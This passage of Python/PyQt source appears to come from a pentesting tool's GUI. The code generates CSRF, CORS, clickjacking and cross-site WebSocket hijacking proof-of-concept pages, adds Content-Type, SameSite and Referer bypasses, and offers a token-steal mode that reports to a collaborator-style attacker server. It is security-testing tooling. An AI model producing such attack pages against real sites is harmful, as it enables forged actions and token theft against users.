            QTimer.singleShot(0, self._fit_referer_desc)
        else:
            self.referer_bypass_desc.setFixedHeight(0)
            self.referer_bypass_desc.setVisible(False)
        self._update_output_format_options()
        if self._current_request_info:
            self._generate_poc()

    def _fit_referer_desc(self):
        """Auto-size the referer bypass description widget to show all content."""
        doc = self.referer_bypass_desc.document()
        vw = self.referer_bypass_desc.viewport().width()
        doc.setTextWidth(vw if vw > 10 else 280)
        self.referer_bypass_desc.setFixedHeight(int(doc.size().height()) + 16)

    # ── Content-Type bypass descriptions ──────────────────────────────
    _CT_BYPASS_DESCRIPTIONS = {
        "None": "",
        "text/plain": (
            "<code>text/plain</code> is a browser <b>simple request</b> content type — "
            "no CORS preflight is triggered. All form-encoded body parameters are sent "
            "as-is with the victim\'s session cookies included. If the server processes "
            "the body regardless of Content-Type, the action executes without the "
            "attacker needing any CORS permission.<br>"
            "<span style=\'color:#ff5555;font-weight:bold;\'>"
            "⚠️  The body will arrive as raw text (e.g. <code>key=value&amp;other=x</code>) — "
            "the server must still parse it correctly for the attack to succeed."
            "</span>"
        ),
        "multipart/form-data": (
            "<code>multipart/form-data</code> is a browser <b>simple request</b> content "
            "type — no CORS preflight is triggered. The browser encodes each body field "
            "as a multipart MIME part. Works best when the server accepts either "
            "<code>multipart/form-data</code> or <code>application/x-www-form-urlencoded</code>."
        ),
        "application/x-www-form-urlencoded": (
            "<code>application/x-www-form-urlencoded</code> is the HTML form default — a "
            "browser <b>simple request</b> type. Useful when the original request uses "
            "<code>application/json</code> and you want to test whether the server "
            "also processes URL-encoded form data (which browsers can submit natively "
            "cross-origin without a preflight)."
        ),
        CSRFGenerator.BYPASS_CT_FORM_JSON: (
            "Submits JSON data using a plain <b>HTML form</b> with "
            "<code>enctype=\"text/plain\"</code> — <strong>no JavaScript required</strong>.<br>"
            "The JSON body is split across <code>name</code> and <code>value</code> attributes "
            "so the browser\'s <code>name=value</code> separator hides the <code>=</code> "
            "inside a harmless extra JSON key (<code>\"_\":\"=\"</code>):<br>"
            "<code>{\"email\":\"you@evil.com\",\"_\":\"=\"}</code><br>"
            "Because <code>text/plain</code> is a CORS simple content type, "
            "<strong>no OPTIONS preflight is triggered</strong> — the victim\'s browser "
            "posts the request directly with session cookies attached.<br>"
            "Works even when JavaScript is blocked (Content Security Policy <code>script-src \'none\'</code>). "
            "Most JSON parsers ignore the extra <code>\"_\"</code> key; "
            "strict parsers that reject unknown fields will block it."
        ),
        CSRFGenerator.BYPASS_CT_PLAIN_JSON: (
            "Sends the original <b>JSON body</b> with "
            "<code>Content-Type: text/plain</code> via <code>fetch()</code> "
            "and <code>mode: \"no-cors\"</code>.<br>"
            "Because <code>text/plain</code> is a browser <em>simple</em> content type, "
            "<strong>no CORS preflight (OPTIONS) is sent</strong> — the real POST "
            "goes straight to the server with the victim\'s session cookies attached.<br>"
            "If the server parses the body as JSON regardless of the Content-Type header "
            "(common in <b>Express, Flask, FastAPI, Go</b> <code>encoding/json</code>, etc.), "
            "the action executes cross-origin without any CORS permission from the server.<br>"
            "<span style=\'color:#50fa7b;font-weight:bold;\'>"
            "✨ Primary attack vector for JSON APIs — clean JSON, real cookies, no preflight."
            "</span>"
        ),
        "application/json": (
            "<code>application/json</code> <b>triggers a CORS preflight</b> and therefore "
            "cannot be submitted cross-origin by a plain HTML form without server "
            "permission. However, it can still be sent via "
            "<code>XMLHttpRequest</code> or <code>fetch()</code>. Useful for testing "
            "whether the server validates the CSRF token differently for JSON vs "
            "form-encoded requests, or if the server\'s CORS policy inadvertently "
            "allows cross-origin JSON requests."
        ),
    }

    def _on_ct_bypass_changed(self, technique: str):
        """Update Content-Type bypass description and regenerate."""
        desc = self._CT_BYPASS_DESCRIPTIONS.get(technique, "")
        if desc:
            self.ct_bypass_desc.setHtml(f"ℹ️&nbsp;&nbsp;{desc}")
            self.ct_bypass_desc.setVisible(True)
            QTimer.singleShot(0, self._fit_ct_desc)
        else:
            self.ct_bypass_desc.setFixedHeight(0)
            self.ct_bypass_desc.setVisible(False)
        self._update_output_format_options()
        if self._current_request_info:
            self._generate_poc()

    def _fit_ct_desc(self):
        """Auto-size the Content-Type bypass description widget to show all content."""
        doc = self.ct_bypass_desc.document()
        vw = self.ct_bypass_desc.viewport().width()
        doc.setTextWidth(vw if vw > 10 else 280)
        self.ct_bypass_desc.setFixedHeight(int(doc.size().height()) + 16)

    def _on_csrf_option_changed(self):
        """Regenerate when any CSRF bypass sub-option field changes."""
        if self._current_request_info:
            self._generate_poc()

    # ── Clickjacking event handlers ────────────────────────────────────────

    def _get_cj_sandbox(self) -> str:
        """Build the sandbox attribute string from the individual checkboxes."""
        tokens = []
        if self.cj_sb_scripts.isChecked():
            tokens.append("allow-scripts")
        if self.cj_sb_forms.isChecked():
            tokens.append("allow-forms")
        if self.cj_sb_origin.isChecked():
            tokens.append("allow-same-origin")
        if not tokens:
            return ""
        return f'sandbox="{" ".join(tokens)}"'

    def _on_cj_sandbox_changed(self):
        """Individual sandbox token toggled — sync the All checkbox, then regenerate."""
        all_checked = (
            self.cj_sb_scripts.isChecked()
            and self.cj_sb_forms.isChecked()
            and self.cj_sb_origin.isChecked()
        )
        self.cj_sb_all.blockSignals(True)
        self.cj_sb_all.setChecked(all_checked)
        self.cj_sb_all.blockSignals(False)
        self._on_cj_option_changed()

    def _on_cj_sandbox_all_changed(self, state: int):
        """All checkbox toggled — check or uncheck all individual tokens."""
        checked = bool(state)
        for cb in (self.cj_sb_scripts, self.cj_sb_forms, self.cj_sb_origin):
            cb.blockSignals(True)
            cb.setChecked(checked)
            cb.blockSignals(False)
        self._on_cj_option_changed()

    def _on_cj_option_changed(self):
        """Regenerate PoC when any Clickjacking option changes."""
        if self._current_request_info:
            self._generate_poc()

    def _on_cj_style_preset_changed(self, style_name: str):
        """Auto-fill decoy text with the preset's default text, then regenerate."""
        preset = ClickjackingPoCGenerator.DECOY_STYLES.get(style_name)
        if preset:
            _, default_text = preset
            self.cj_decoy_text.blockSignals(True)
            self.cj_decoy_text.setText(default_text)
            self.cj_decoy_text.blockSignals(False)
        self._on_cj_option_changed()

    def _cj_autofill_url(self):
        """Fill the Clickjacking target URL from the currently parsed request."""
        if self._current_request_info and self._current_request_info.url:
            self.cj_target_url.setText(self._current_request_info.url)
        else:
            raw = self.request_edit.toPlainText().strip()
            if raw:
                self._update_request_info()
                if self._current_request_info:
                    self.cj_target_url.setText(self._current_request_info.url)

    def _align_in_browser(self):
        """Open the test-mode alignment page in a browser with a live callback server.

        Starts a tiny localhost HTTP server; when the user finishes aligning the
        decoy button and clicks '✅ Send to PoC Tool' in the browser toolbar, the
        final X/Y offsets and decoy position are sent back here automatically, the
        spinboxes are updated, and the clean attack-mode PoC is regenerated.
        """
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request",
                "Please paste a raw HTTP request first.")
            return

        # Stop any previous alignment server that may still be running
        if hasattr(self, '_cj_align_server') and self._cj_align_server.isRunning():
            self._cj_align_server.stop()
            self._cj_align_server.wait(2000)   # up to 2 s; srv.timeout=0.5 so 1 tick is enough

        self._cj_align_server = _CJAlignmentServer(self)
        self._cj_align_server.server_ready.connect(self._on_alignment_server_ready)
        self._cj_align_server.offsets_received.connect(self._on_alignment_received)
        self._cj_align_server.start()
        self.status_lbl.setText("🔌 Starting alignment server…")
        self.status_lbl.setStyleSheet(f"color:{COLOR_ACCENT};")

    @pyqtSlot(int)
    def _on_alignment_server_ready(self, port: int):
        """Server is listening — generate the test-mode page and open it in the browser."""
        info = self._current_request_info
        if not info:
            return

        target_url     = self.cj_target_url.text().strip() or info.url
        decoy_text     = self.cj_decoy_text.text().strip() or "🎁 Claim your prize!"
        style_name     = self.cj_decoy_style_combo.currentText()
        decoy_css, _   = ClickjackingPoCGenerator.DECOY_STYLES.get(
                             style_name,
                             ClickjackingPoCGenerator.DECOY_STYLES["Prize / Win"])
        x_off          = self.cj_x_offset.value()
        y_off          = self.cj_y_offset.value()
        decoy_x        = self.cj_decoy_x.value()
        decoy_y        = self.cj_decoy_y.value()
        decoy_w        = self.cj_decoy_w.value()
        decoy_h        = self.cj_decoy_h.value()
        iframe_w       = self.cj_iframe_w.value()
        iframe_h       = self.cj_iframe_h.value()
        multistep      = self.cj_multistep.isChecked()
        sandbox_attr   = self._get_cj_sandbox()

        html = ClickjackingPoCGenerator.generate_test_mode(
            target_url      = target_url,
            target_element  = "",
            decoy_text      = decoy_text,
            decoy_css       = decoy_css,
            iframe_x_offset = x_off,
            iframe_y_offset = y_off,
            iframe_width    = iframe_w,
            iframe_height   = iframe_h,
            decoy_x         = decoy_x,
            decoy_y         = decoy_y,
            decoy_x2        = self.cj_decoy_x2.value(),
            decoy_y2        = self.cj_decoy_y2.value(),
            decoy_width     = decoy_w,
            decoy_height    = decoy_h,
            decoy_font_size = self.cj_decoy_fs.value(),
            sandbox_attr    = sandbox_attr,
            multistep       = multistep,
            decoy_text2     = self.cj_decoy_text2.text().strip() or "Click me next",
            callback_port   = port,
        )

        # Serve the page from the callback server so fetch() works same-origin
        # (file:// pages cannot make fetch requests to http:// due to browser restrictions)
        self._cj_align_server.set_page(html)
        webbrowser.open(f"http://127.0.0.1:{port}/")
        self.status_lbl.setText(
            "🎯 Alignment page opened — adjust position, then click "
            "'✅ Send to PoC Tool' in the browser")
        self.status_lbl.setStyleSheet(f"color:{COLOR_ACCENT};")

    @pyqtSlot(int, int, int, int, int, int, int, int, int, int, int)
    def _on_alignment_received(self, x_off: int, y_off: int,
                               decoy_x: int, decoy_y: int,
                               decoy_x2: int, decoy_y2: int,
                               decoy_w: int, decoy_h: int,
                               iframe_w: int, iframe_h: int,
                               decoy_fs: int):
        """Alignment offsets received from browser — update spinboxes and regenerate PoC."""
        for w in (self.cj_x_offset, self.cj_y_offset,
                  self.cj_decoy_x,  self.cj_decoy_y,
                  self.cj_decoy_x2, self.cj_decoy_y2,
                  self.cj_decoy_w,  self.cj_decoy_h,
                  self.cj_iframe_w, self.cj_iframe_h,
                  self.cj_decoy_fs):
            w.blockSignals(True)
        self.cj_x_offset.setValue(x_off)
        self.cj_y_offset.setValue(y_off)
        self.cj_decoy_x.setValue(decoy_x)
        self.cj_decoy_y.setValue(decoy_y)
        self.cj_decoy_x2.setValue(decoy_x2)
        self.cj_decoy_y2.setValue(decoy_y2)
        self.cj_decoy_w.setValue(decoy_w)
        self.cj_decoy_h.setValue(decoy_h)
        self.cj_iframe_w.setValue(iframe_w)
        self.cj_iframe_h.setValue(iframe_h)
        self.cj_decoy_fs.setValue(decoy_fs)
        for w in (self.cj_x_offset, self.cj_y_offset,
                  self.cj_decoy_x,  self.cj_decoy_y,
                  self.cj_decoy_x2, self.cj_decoy_y2,
                  self.cj_decoy_w,  self.cj_decoy_h,
                  self.cj_iframe_w, self.cj_iframe_h,
                  self.cj_decoy_fs):
            w.blockSignals(False)
        self._generate_poc()
        self.status_lbl.setText("✓ Alignment received — PoC updated and ready to deploy")
        self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
        QTimer.singleShot(4000, lambda: self.status_lbl.setText("Ready"))

    def _open_csrf_tester(self):
        """Open the CSRF advanced analysis dialog (Step 1), which then launches the tester."""
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request",
                "Please paste a raw HTTP request first.")
            return
        raw = self.request_edit.toPlainText().strip()
        dlg = CSRFAnalysisDialog(self._current_request_info, raw, parent=self)
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        dlg.show()
        self._active_csrf_dlg = dlg   # keep reference; prevent GC

    def _open_samesite_tester(self):
        """Open the SameSite Lax bypass tester dialog."""
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request",
                "Please paste a raw HTTP request first.")
            return
        technique = self.samesite_bypass_combo.currentText()
        if technique == "None":
            QMessageBox.information(self, "No Technique Selected",
                "Select a SameSite bypass technique in the dropdown before running the test.")
            return
        raw          = self.request_edit.toPlainText().strip()
        token_bypass = self.csrf_bypass_combo.currentText()
        dlg = SameSiteTesterDialog(
            self._current_request_info, raw,
            token_bypass=token_bypass, parent=self
        )
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        dlg.show()
        self._active_samesite_dlg = dlg

    def _open_referer_tester(self):
        """Open the Referer header bypass tester dialog."""
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request",
                "Please paste a raw HTTP request first.")
            return
        raw = self.request_edit.toPlainText().strip()
        dlg = RefererTesterDialog(self._current_request_info, raw, parent=self)
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        dlg.show()
        self._active_referer_dlg = dlg

    def _open_ct_tester(self):
        """Open the Content-Type bypass tester dialog."""
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request",
                "Please paste a raw HTTP request first.")
            return
        raw = self.request_edit.toPlainText().strip()
        dlg = ContentTypeTesterDialog(self._current_request_info, raw, parent=self)
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        dlg.show()
        self._active_ct_dlg = dlg

    def _on_output_format_changed(self, format_type: str):
        """Handle output format change."""
        # Show Token-Steal sub-panel only when that format is selected
        if hasattr(self, "ts_group"):
            self.ts_group.setVisible(format_type == "Token-Steal")
        if self._current_request_info:
            self._generate_poc()

    def _on_ts_option_changed(self):
        """Regenerate PoC when a Token-Steal field changes."""
        if self._current_request_info:
            self._generate_poc()


    def _on_server_changed(self, server: str):
        """Handle attacker server change."""
        if self._current_request_info:
            self._generate_poc()
    
    def _reset_attacker_server(self):
        """Reset collaborator URL to default placeholder."""
        self.attacker_server_edit.setText("https://YOUR-ID.oastify.com")
    
    def _on_request_changed(self):
        """Handle request text changes."""
        self._update_request_info()
        # Restart the shared debounce timer (stop → start resets the interval).
        self._auto_generate_timer.stop()
        self._auto_generate_timer.start(500)
    
    def _auto_generate(self):
        """Auto-generate PoC on request change (called after debounce)."""
        # _update_request_info() already ran synchronously in _on_request_changed.
        # If info is still None after that call the request text was empty/invalid.
        if not self._current_request_info:
            raw = self.request_edit.toPlainText().strip()
            if not raw:
                return
            # One final attempt in case the first parse raced with Qt's signal delivery
            self._update_request_info()
        if self._current_request_info:
            self._generate_poc()
    
    def _on_scheme_changed(self, scheme: str):
        """Handle scheme change."""
        self._update_request_info()
        if self._current_request_info:
            self._generate_poc()
    
    def _on_host_changed(self, host: str):
        """Handle host change."""
        self._update_request_info()
        if self._current_request_info:
            self._generate_poc()
    
    def _update_request_info(self):
        """Parse current request and update info display."""
        raw_request = self.request_edit.toPlainText().strip()
        if not raw_request:
            self.info_text.clear()
            self._current_request_info = None
            return
        
        # Build request info with UI overrides
        ui_host = self.host_edit.text().strip()
        ui_scheme = self.scheme_combo.currentText()
        
        self._current_request_info = _build_request_info(raw_request, ui_host, ui_scheme)
        
        # Update info display
        info = self._current_request_info
        info_text = f"""📍 Target Information
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method:     {info.method}
URL:        {info.url}
Host:       {info.host}
Scheme:     {info.scheme}
Port:       {info.port}

📋 Headers ({len(info.headers)})
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        # Show first 10 headers
        for k, v in list(info.headers.items())[:10]:
            info_text += f"{k}: {v[:60]}\n"
        if len(info.headers) > 10:
            info_text += f"... and {len(info.headers) - 10} more\n"
        
        if info.params:
            info_text += f"\n🔍 Query Parameters ({len(info.params)})\n"
            info_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for k, v in list(info.params.items())[:5]:
                info_text += f"{k}: {v}\n"
        
        if info.body:
            body_preview = info.body[:200]
            if len(info.body) > 200:
                body_preview += "..."
            info_text += f"\n📦 Body ({len(info.body)} chars)\n"
            info_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            info_text += body_preview
        
        self.info_text.setPlainText(info_text)
    
    def _on_generate_poc(self):
        """Generate PoC code."""
        if not self._current_request_info:
            QMessageBox.warning(self, "No Request", 
                               "Please paste a raw HTTP request first.")
            return
        
        self._generate_poc()
    
    def _generate_poc(self):
        """Generate PoC based on current settings."""
        if not self._current_request_info:
            return
        
        info = self._current_request_info
        poc_type = self.poc_type_combo.currentText()
        output_format = self.lang_combo.currentText()
        attacker_server = self.attacker_server_edit.text().strip()
        
        # Ensure attacker server has protocol
        if attacker_server and not attacker_server.startswith(("http://", "https://")):
            attacker_server = "https://" + attacker_server
        
        poc_code = ""
        
        if poc_type == "CORS PoC":
            # Determine CORS test type
            cors_test_type = self.cors_test_type.currentText()

            if cors_test_type == "Origin Reflection":
                poc_code = CORSExploitGenerator.generate_origin_reflection_poc(info, attacker_server)
            elif cors_test_type == "Null Origin":
                poc_code = CORSExploitGenerator.generate_null_origin_poc(info, attacker_server)
            elif cors_test_type == "Trusted Subdomain":
                use_xss = self.subdomain_xss_check.isChecked()
                xss_url = self.subdomain_xss_url.text().strip()
                xss_param = self.subdomain_xss_param.text().strip()
                poc_code = CORSExploitGenerator.generate_trusted_subdomain_poc(
                    info, attacker_server,
                    xss_mode=use_xss,
                    xss_url=xss_url,
                    xss_param=xss_param,
                )
            elif cors_test_type == "Wildcard (*) Misconfig":
                poc_code = CORSExploitGenerator.generate_wildcard_misconfig_poc(info, attacker_server)
            else:
                # Fallback: default to origin reflection
                logger.warning("Unknown CORS test type %r — falling back to Origin Reflection", cors_test_type)
                poc_code = CORSExploitGenerator.generate_origin_reflection_poc(info, attacker_server)

        elif poc_type == "Clickjacking PoC":
            # Use URL from the UI field first, fall back to the parsed request URL
            target_url     = self.cj_target_url.text().strip() or info.url
            decoy_text     = self.cj_decoy_text.text().strip() or "🎁 Claim your prize!"
            style_name     = self.cj_decoy_style_combo.currentText()
            decoy_css, _   = ClickjackingPoCGenerator.DECOY_STYLES.get(
                                 style_name,
                                 ClickjackingPoCGenerator.DECOY_STYLES["Prize / Win"])
            x_off          = self.cj_x_offset.value()
            y_off          = self.cj_y_offset.value()
            decoy_x        = self.cj_decoy_x.value()
            decoy_y        = self.cj_decoy_y.value()
            decoy_w        = self.cj_decoy_w.value()
            decoy_h        = self.cj_decoy_h.value()
            decoy_fs       = self.cj_decoy_fs.value()
            iframe_w       = self.cj_iframe_w.value()
            iframe_h       = self.cj_iframe_h.value()
            sandbox_attr   = self._get_cj_sandbox()

            if self.cj_multistep.isChecked():
                poc_code = ClickjackingPoCGenerator.generate_multistep_mode(
                    target_url      = target_url,
                    decoy_text1     = decoy_text,
                    decoy_text2     = self.cj_decoy_text2.text().strip() or "Click me next",
                    decoy_css       = decoy_css,
                    iframe_x_offset = x_off,
                    iframe_y_offset = y_off,
                    iframe_width    = iframe_w,
                    iframe_height   = iframe_h,
                    decoy_x         = decoy_x,
                    decoy_y         = decoy_y,
                    decoy_x2        = self.cj_decoy_x2.value(),
                    decoy_y2        = self.cj_decoy_y2.value(),
                    decoy_width     = decoy_w,
                    decoy_height    = decoy_h,
                    decoy_font_size = decoy_fs,
                    sandbox_attr    = sandbox_attr,
                )
            else:
                poc_code = ClickjackingPoCGenerator.generate_attack_mode(
                    target_url      = target_url,
                    target_element  = "",
                    decoy_text      = decoy_text,
                    decoy_css       = decoy_css,
                    iframe_x_offset = x_off,
                    iframe_y_offset = y_off,
                    iframe_width    = iframe_w,
                    iframe_height   = iframe_h,
                    decoy_x         = decoy_x,
                    decoy_y         = decoy_y,
                    decoy_width     = decoy_w,
                    decoy_height    = decoy_h,
                    decoy_font_size = decoy_fs,
                    sandbox_attr    = sandbox_attr,
                )

        elif poc_type == "CSWSH PoC":
            ws_url   = self.cswsh_ws_url.text().strip()
            raw_msgs = self.cswsh_messages.toPlainText()
            messages = [m for m in raw_msgs.splitlines() if m.strip()]
            reconnect = self.cswsh_reconnect.isChecked()
            poc_code = CSWSHGenerator.generate(
                request_info    = info,
                ws_url          = ws_url,
                messages        = messages,
                attacker_server = attacker_server,
                reconnect       = reconnect,
            )

        else:  # CSRF PoC
            auto_submit     = self.csrf_auto_submit.isChecked()
            new_tab         = self.csrf_new_tab.isChecked()
            bypass          = self.csrf_bypass_combo.currentText()
            samesite_bypass = self.samesite_bypass_combo.currentText()
            referer_bypass  = self.referer_bypass_combo.currentText()
            ct_bypass       = self.ct_bypass_combo.currentText()

            # SameSite bypass: build GET redirect, optionally composing with token bypass
            if samesite_bypass == "Strict \u2013 Client-side Redirect":
                redirect_url = self.samesite_redirect_url.text().strip()
                poc_code = CSRFGenerator.generate_samesite_strict_redirect_poc(redirect_url)
            elif samesite_bypass == "Lax \u2013 GET request override (_method=POST)":
                poc_code = CSRFGenerator.generate_samesite_lax_get_poc(
                    info, token_bypass=bypass)
            elif output_format == "Token-Steal":
                # Token-Steal is independent of bypass/samesite — always XHR-based
                get_url        = self.ts_get_url.text().strip()
                token_selector = self.ts_selector.text().strip()
                token_param    = self.ts_token_param.text().strip()
                poc_code = CSRFGenerator.generate_csrf_token_steal_poc(
                    info,
                    get_url=get_url,
                    token_selector=token_selector,
                    token_param=token_param,
                    auto_submit=auto_submit,
                    new_tab=new_tab,
                    attacker_server=attacker_server)
            else:
                # Non-session cookie extra inputs (only relevant for that bypass)
                nsc_kwargs = {}
                if bypass == "Token validation – Non-session cookie":
                    nsc_kwargs = dict(
                        csrf_key   = self.nsc_csrf_key.text().strip(),
                        csrf_token = self.nsc_csrf_token.text().strip(),
                        inject_url = self.nsc_inject_url.text().strip(),
                    )
                elif bypass == "Token validation – Double submit cookie":
                    nsc_kwargs = dict(
                        fake_token = self.ds_fake_token.text().strip() or "fake",
                        inject_url = self.ds_inject_url.text().strip(),
                    )
                elif bypass == CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE:
                    nsc_kwargs = dict(
                        inject_url = self.tvc_inject_url.text().strip(),
                    )

                if bypass == CSRFGenerator.BYPASS_HEAD_METHOD:
                    poc_code = CSRFGenerator.generate_csrf_head_poc(
                        info, auto_submit=auto_submit, new_tab=new_tab,
                        attacker_server=attacker_server)
                elif bypass == CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT:
                    hdr_name = self.ch_header_name.text().strip() or "X-CSRF-Token"
                    poc_code = CSRFGenerator.generate_csrf_custom_header_absent_poc(
                        info, csrf_header_name=hdr_name,
                        auto_submit=auto_submit, new_tab=new_tab,
                        attacker_server=attacker_server)
                elif output_format == "Forms":
                    poc_code = CSRFGenerator.generate_csrf_form_poc(
                        info, auto_submit, new_tab, attacker_server, bypass=bypass, **nsc_kwargs)
                elif output_format == "iFrame":                    poc_code = CSRFGenerator.generate_csrf_iframe_poc(
                        info, attacker_server, bypass=bypass, auto_submit=auto_submit, **nsc_kwargs)
                elif output_format == "IMG":
                    poc_code = CSRFGenerator.generate_csrf_img_poc(
                        info, attacker_server, bypass=bypass, auto_submit=auto_submit, **nsc_kwargs)
                elif output_format == "XHR":
                    poc_code = CSRFGenerator.generate_csrf_xhr_poc(
                        info, attacker_server, bypass=bypass, auto_submit=auto_submit, **nsc_kwargs)
                elif output_format == "Link":
                    poc_code = CSRFGenerator.generate_csrf_link_poc(
                        info, attacker_server, bypass=bypass, auto_submit=auto_submit, **nsc_kwargs)
                else:
                    poc_code = CSRFGenerator.generate_csrf_form_poc(
                        info, auto_submit, new_tab, attacker_server, bypass=bypass, **nsc_kwargs)

            # Referer header bypass: suppress Referer via meta referrer policy
            if referer_bypass == "Absent \u2013 Validation depends on header being present":
                poc_code = poc_code.replace(
                    '<head>', '<head>\n    <meta name="referrer" content="never">', 1)
            elif referer_bypass == "Circumvent \u2013 Validation can be bypassed (query string trick)":
                if samesite_bypass == "Lax \u2013 GET request override (_method=POST)":
                    # Combined: SameSite Lax GET navigation + Referer circumvent pushState
                    poc_code = CSRFGenerator.generate_samesite_lax_referer_circumvent_poc(
                        info, token_bypass=bypass)
                elif bypass == CSRFGenerator.BYPASS_REQUEST_METHOD:
                    # "Request method" already produced a GET form – inject Referer
                    # circumvent pieces into it rather than replacing with a POST form.
                    target_host = info.host or urllib.parse.urlparse(info.url).netloc
                    meta_tag = '<meta name="referrer" content="unsafe-url">'
                    warning = (
                        f'    <p style="color:#e67e22;">'
                        f'\u26a0\ufe0f  <strong>Important:</strong> serve this page with '
                        f'<code>Referrer-Policy: unsafe-url</code> response header '
                        f'so browsers include the full URL query string in the Referer.</p>'
                    )
                    pushstate = (
                        f'\n        // Referer circumvent: place target domain in this page\u2019s URL\n'
                        f'        history.pushState("", "", "/?{target_host}");\n        '
                    )
                    # Inject meta tag into <head>
                    poc_code = poc_code.replace('<head>', f'<head>\n    {meta_tag}', 1)
                    # Inject warning paragraph before the form
                    poc_code = poc_code.replace('<form ', f'{warning}\n    <form ', 1)
                    # Inject pushState before any existing console.log in the script
                    poc_code = poc_code.replace(
                        'console.log("CSRF bypass PoC loaded',
                        f'{pushstate}console.log("CSRF bypass PoC loaded', 1)
                else:
                    poc_code = CSRFGenerator.generate_csrf_referer_circumvent_poc(
                        info, auto_submit=auto_submit, new_tab=new_tab,
                        attacker_server=attacker_server, bypass=bypass)
        
            # Content-Type bypass: patch the generated PoC's form enctype / note
            if ct_bypass == CSRFGenerator.BYPASS_CT_PLAIN_JSON:
                poc_code = CSRFGenerator.generate_csrf_plain_json_poc(
                    info, auto_submit=auto_submit, new_tab=new_tab,
                    attacker_server=attacker_server)
            elif ct_bypass == CSRFGenerator.BYPASS_CT_FORM_JSON:
                poc_code = CSRFGenerator.generate_csrf_form_json_poc(
                    info, auto_submit=auto_submit, new_tab=new_tab,
                    attacker_server=attacker_server)
            elif ct_bypass != "None":
                _ct_val = ct_bypass   # e.g. "text/plain", "multipart/form-data", "application/json"
                _form_based_output = output_format in ("Forms", "iFrame", "IMG", "Link")
                # ── HTML form: add or replace enctype attribute ──────────────
                if 'enctype="' in poc_code:
                    poc_code = re.sub(r'enctype="[^"]*"', f'enctype="{_ct_val}"', poc_code, count=1)
                elif '<form ' in poc_code:
                    poc_code = poc_code.replace('<form ', f'<form enctype="{_ct_val}" ', 1)
                # ── XHR: update xhr.setRequestHeader("Content-Type", ...) ────
                poc_code = re.sub(
                    r'(xhr\.setRequestHeader\("Content-Type",\s*)"[^"]*"',
                    rf'\1"{_ct_val}"',
                    poc_code,
                )
                # ── fetch / plain JS: update "Content-Type": "..." ───────────
                poc_code = re.sub(
                    r'("Content-Type":\s*)"[^"]*"',
                    rf'\1"{_ct_val}"',
                    poc_code,
                )
                # ── application/json: body conversion + format-specific warnings ──
                if _ct_val == "application/json":
                    if _form_based_output:
                        # Browsers don't support this enctype — warn
                        _json_enctype_warn = (
                            f'    <p style="background:#4a1500;color:#ff9966;'
                            f'border-left:4px solid #e74c3c;padding:8px 12px;'
                            f'font-family:monospace;font-size:0.9em;margin:0 0 8px 0;">'
                            f'\u26a0\ufe0f  <strong>Note:</strong> '
                            f'<code>enctype="application/json"</code> is <em>not</em> a valid HTML form '
                            f'encoding type. Browsers will silently fall back to '
                            f'<code>application/x-www-form-urlencoded</code>. '
                            f'Switch the Output Format to <strong>XHR</strong> or <strong>fetch</strong> '
                            f'to actually send <code>Content-Type: application/json</code>.'
                            f'</p>'
                        )
                        poc_code = poc_code.replace('<body>', f'<body>\n{_json_enctype_warn}', 1)
                    else:
                        # XHR / fetch: convert URL-encoded body → JSON and warn about preflight
                        _orig_body = info.body or ""
                        if _orig_body:
                            # Only convert if body is not already valid JSON
                            _already_json = False
                            try:
                                json.loads(_orig_body)
                                _already_json = True
                            except (ValueError, Exception):
                                pass
                            if not _already_json:
                                try:
                                    _parsed = urllib.parse.parse_qs(
                                        _orig_body, keep_blank_values=True)
                                    if _parsed:
                                        _json_body = json.dumps(
                                            {k: vs[0] for k, vs in _parsed.items()})
                                        # XHR: replace xhr.send('url-encoded') with JSON
                                        _orig_sq = _orig_body.replace("'", "\\'").replace("\n", "\\n")
                                        _json_sq = _json_body.replace("'", "\\'")
                                        poc_code = poc_code.replace(
                                            f"xhr.send('{_orig_sq}');",
                                            f"xhr.send('{_json_sq}');")
                                        # fetch: replace body: `url-encoded` with JSON
                                        _orig_bt = _orig_body.replace('`', '\\`')
                                        _json_bt = _json_body.replace('`', '\\`')
                                        poc_code = poc_code.replace(
                                            f"body: `{_orig_bt}`",
                                            f"body: `{_json_bt}`")
                                except Exception:
                                    pass
                        # Preflight warning for non-simple CT on XHR/fetch
                        _preflight_warn = (
                            f'    <p style="background:#1a2a3a;color:#87ceeb;'
                            f'border-left:4px solid #3498db;padding:8px 12px;'
                            f'font-family:monospace;font-size:0.9em;margin:0 0 8px 0;">'
                            f'\u2139\ufe0f  <strong>CORS Preflight:</strong> '
                            f'<code>Content-Type: application/json</code> is a <em>non-simple</em> '
                            f'CORS request type — the browser sends a preflight '
                            f'<code>OPTIONS</code> request first. '
                            f'The actual POST only fires if the server responds with '
                            f'<code>Access-Control-Allow-Headers: content-type</code>. '
                            f'To bypass preflight entirely, use '
                            f'<strong>text/plain \u2013 JSON body (no preflight)</strong> '
                            f'from the Content-Type Bypass dropdown.'
                            f'</p>'
                        )
                        poc_code = poc_code.replace('<body>', f'<body>\n{_preflight_warn}', 1)
                # ── multipart/form-data on XHR/fetch: use FormData so the browser
                #    generates the boundary automatically.  Setting the header manually
                #    omits the boundary and produces an unparseable request. ──────────
                if _ct_val == "multipart/form-data" and not _form_based_output:
                    _orig_body = info.body or ""
                    _fd_appends: list = []
                    try:
                        _mfd_json = json.loads(_orig_body)
                        if isinstance(_mfd_json, dict):
                            for _k, _v in _mfd_json.items():
                                _fd_appends.append(
                                    f'        formData.append({json.dumps(str(_k))}, {json.dumps(str(_v))});')
                    except (json.JSONDecodeError, ValueError):
                        try:
                            for _k, _v in urllib.parse.parse_qsl(_orig_body, keep_blank_values=True):
                                _fd_appends.append(
                                    f'        formData.append({json.dumps(_k)}, {json.dumps(_v)});')
                        except Exception:
                            pass
